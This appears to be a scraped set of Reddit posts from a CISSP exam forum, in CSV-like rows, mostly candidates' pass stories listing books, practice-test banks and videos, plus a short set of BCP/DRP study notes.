Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

Good luck!",2021-08-08
2676,ozgark,PASSED At 100Q last Monday,"Hi y'all

As te title says, I pases my CISSP Exam last Monday at 100 questions with 40 min left. 

A little bit about me:

I'm a  information security Analyst focused in incident response and forensics (2.5 years) with 3.5 Years of additional IT background: 1 year sysadmin, 2.5 years as NOC engineer for an ISP (Strong networking).  Even though my technical background, I'm willing to get out of the weeds and move to a more managerial role so I started passing SSCP and now CISSP. 

Preparation:

Read the book 4 hours per day (leveraging 2 hours saved by remote work) from Monday to Friday and rest the weekend. After book I did the practice exams while identifying my weakness. Re-read /refresh my weak domains with Sunflower and Mindmaps, finally a whole month of just Cissprep.

The Exam:

As everyone says I didn't know if pass or fail until grab the results sheet. The exam was SO HIGH level at some times and too technical in other times (Domain 3-4).

I'm from Dominican Republic, so mi natural language is Spanish (sorry for my English) and that increases the difficulty level for me in the question reading/understanding, at the point of having to read one single question 5 times. BUT doing my best with the reading, managing my time and thinking like a manager I passed 

Finally: Thanks to everyone in this reddit channel for share your experiences and all the insight. Being here was really helpful for motivation and preparation. 🙏",2021-08-06
2677,oo5siy,Today was the day......,"Today was the day that I skipped like a schoolgirl, air punching, and yelling around a parking lot for 10 minutes…. Yes, it happened. Okay, what you’re here for.

After a little over 2 hours (I think), I have concurred this thing… I have roughly 9 years of experience in the field, with various certifications (CASP+, SEC+, A+, and CCNA). I am also pursing an MS-Info Science – Info Assurance.

Length of preparation for me was two months and some change… I chose to utilize my summer break from Grad school to prepare for this exam… and it worked out! Not itemizing hours, or questions, or pages, or any ""quantifiable things"" as everyone is different, and everyone takes in information at different speeds.... but here's what I have for you!

My piece(s) of advice:

1. Why do you want this thing? It’s not a “fun” process…. If you do not have a solid reason to dedicate yourself for however long you identify you need to prepare… it might not happen… I’ve creeped this thread, messaged many, and it’s happened, yes…however the odds are not likely. Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

Good luck!",2021-07-20
2678,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

TLDR: The Official (ISC)² study materials are S-tier, don’t stress over practice exam scores, take breaks and separate when you get tired.",2021-07-19
2679,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20
2680,ovz7o7,CISSP Passed in first attempt,"Hello Everyone,

I provisionally passed my CISSP exam yesterday.

The exam was Ok in the beginning and I it was brutal after 20 questions, and I never felt that I am going to Pass it. I feel it tests your patience as well during the exam.

I spent around 30 minutes for first 15 questions and started increasing my speed after 60 questions, when my exam  finished I was having 50Q and 50 minutes left.

&#x200B;

IMPORTANT \*\*\*\*\*\*\* Try to write your notes in the sequence/way that exam expects from you.. Like Advantages/disadvantages of each thing e.g. RBAC, Access models (Write them in series from Most to Least, Primary and Secondary etc.). It will help you with the exact mindset of the exam...

Reading book is very important..

&#x200B;

Resources I used:

&#x200B;

Sybex OSG 8th edition

11th hour

and Adam's Bootcamp noted from Discord

Thor's Udemy course and old question bank

Kelly's Cybrary Course to refresh the knowledge

BOSON and Sybex Official practice test (recommended)

Luke Ahmed's subscription (too much information in the questions, in exam questions are pretty small 2-3 lines max and will clear descriptions)

CISSPrep Question (not same like exam, don't take these question near to exam. If English is not your first language then it will give you some tough time, but it may improve your thinking skill)

&#x200B;

Again, This is my experience, I didn't like the lengthy questions but if it works for you then it is good else don't spend too much time and move on..

&#x200B;

One recommendation, scores of the practice questions is not relevant, I was getting 40%-50% in Luke questions, which was kind of demotivation for me, so I just completed them without looking at the result.

Still, I managed to passed at 100Q, I was still feeling that I am not fully prepared (even after passing the exam :D )... so you will be never prepared the exam....

&#x200B;

The new Questions of Sybex Official guide are better than previous version.

&#x200B;

Best of luck for your studies....

2681,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

\- [CISSP Exam Cram videos](https://www.youtube.com/watch?v=8TdL16yYNd0&list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD&ab_channel=InsideCloudandSecurity) by Inside Cloud Security **(Awesome playlist, highly recommend!)**

2682,okfajm,Passed my CISSP provisionally.,"So I wrote my CISSP test today and passed provisionally. I am thrilled, but I also put a lot of work into it, so thankful as well. A little about me... I have about 15 years in IT professionally. Much of that in dev and cyber.

1st impression... Test was slightly easier than I thought it would be. 

Materials: 

Official study guide (8th edition)

2x the official questions.. 2nd and 3rd editions (of which I completed all questions)

\-you must understand the why behind the question.  

Destination certification and cram video series on YouTube (thanks to the presenters))

About 600 flash cards I hand wrote and studied from.  

I studied seriously for about 3 months. But quite honestly I am always reading about cyber/cryptography and I am avid cyber podcast listener. 

This is not an easy test as it is a lot of material. But if you put in the time and energy... while having some experience, it is totally doable. I hate tests with a passion. So if I can do it, so can you.",2021-07-14
2683,ohxoha,Passed today - was certain I didnt!,"First - I'm making this post because reading everyone elses helped me a LOT. So, Reddit = 10/10

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.  Add Kelly Henderson video ""Why you will pass"" and you can shit bricks when you see ""Congratulations"" on your test results too.",2021-07-11
2684,ob3mpw,Provisionally Passed 21 June 2021!!!,"150 questions in about 2 hours.  I made my first attempt about 4 years ago. On February 2021 I decided to give it another try. I booked the test to make sure I had a deadline. I studied a lot during my free time. I never felt prepared for this beast. I made sure that I truly understood the material and wasn’t just memorizing things. This helped me A LOT during the exam. I felt confident in maybe three of my answers. I read the question several times, read the answers, then read the question again. English is not my first language and I sometimes have a hard time figuring out what they are asking. I honestly thought I had failed. I didn’t look at the paper until I was outside the building. I almost cried when I read “Congratulations….” on the paper. I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail. 

Experience:

I have about 14 years of experience in various roles as a SOC analyst, RMF roles, and engineering roles. 

If you’re reading this and are studying for the CISSP…. You can do it!!!!!!!",2021-06-30
2685,olkv47,2nd Attempt Passed,Provisionally passed. 150 questions 100 minutes or so. So relived now. Definitely think like a manager and think about the needs of the business and the businesses policies.,2021-07-16
2686,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29
2687,oxsg62,CISSP passed after 150 questions,"Hi All,

I have passed the exam today thanks to the resources I got from the community!

I took a classroom CISSP course at the beginning of the year and forgot about the exam. 2 weeks ago I decided to take it on and I passed on 1st try :). 

I started my prep with Cybrary free course from Kelly Handerhan which was quite good, but I liked other videos better :)

[https://www.cybrary.it/course/cissp/](https://www.cybrary.it/course/cissp/)

I think I mostly passed thanks to those youtube courses. I liked Pete Zerger's videos the most. 

What's the most important: I do not recommend taking my approach. I passed but I think I was close to failing as I had to go through 150 questions. Take more time to prepare ;)",2021-08-04
2688,oclvd0,CISSP official study guide + ADD == concentration nightmare. Anyone feel the same?,"So I’ve learned I study best and absorb material best if I’m actively participating in what I’m reading. Whether I’m listening to something and taking notes or reading and taking notes. The official study guide or any other books are something that I’ve never been able to read page by page because I can’t focus. 

Has anyone had any luck reviewing **just** the summary portions of each chapter and taking notes/researching what is not familiar and studying the book this way? This seems like the best way to absorb the meat of what’s necessary to understand for each chapter without reading every word page-by-page. Don’t get me wrong, it’s a great resource but I just can’t bring myself to read it word-for-word.

&#x200B;

I wanna thank all of you for all the tips in this sub, it's incredible how much info we have here!!

What worked for me:

* Mike Chapple LinkedIn videos
* Sybex practice tests and the Wiley efficient learning app - This is a great platform!
* Destination Certification CISSP Mind Map on Youtube - This guy does a wonderful job of summarizing and explaining key points in each domain. I think they compliment Chapple's videos really well. I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.  

What didn't work:

* 11th Hour - so general I fell asleep
* [cisspprep.net](https://cisspprep.net) \- I picked it up on here and some of the reviews were great so I gave it a try... the website is somewhat confusing and while I got some good tips I felt like I was mostly looking to understand the author's intent in the question and what they wanted me to select than the actual info that's relevant for the exam

About me:

I have over 15 years of IT experience. I've been on the engineering side, the IT side, and now I work for a security vendor and talk security to CISO/CIO, architects, engineers and a LOT of the material for the exam was driving me nuts because it was just wrong. I knew what was expected of me to answer and so I did just that while grinding my teeth.

Once again, thank you all for all the good tips!

2691,om95hn,BCP/DRP Quick Notes,"Some general BCP/DRP notes I had lying around if it helps anyone:

At a high-level, the most important thing to remember is that a BCP/DRP program has two main objectives: the first one is to preserve human life, to keep the human heart beating.  Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

BCP process and steps (Not specifics, just the general flow)

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

